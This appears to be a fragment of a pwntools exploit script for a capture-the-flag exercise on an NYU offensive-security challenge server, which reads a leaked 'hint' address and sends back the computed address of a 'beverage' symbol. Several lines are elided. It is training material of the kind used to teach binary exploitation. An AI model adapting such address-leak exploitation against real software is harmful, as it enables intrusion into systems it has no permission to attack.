...
LOCAL = False
source_address_name = "hint"
target_address_name = "beverage"

if LOCAL:
    p = process("./fave")
    libc = "./fave"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1251)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./fave"

# Extract the given address from the message and read up until expected input
print(p.recvuntil(b"`hint`: ").decode())
...
# The target address that points to the symbol `beverage` is 0x43f8
target_address_offset = 0x43f8
...
# This challenge required numeric bytes
target_address_numeric = target_address
print(f"{target_address_name:<15} address num : {target_address_numeric}")

# Get to prompt and send the answer
print(p.recvuntil(b">").decode())
p.sendline(str(target_address_numeric))
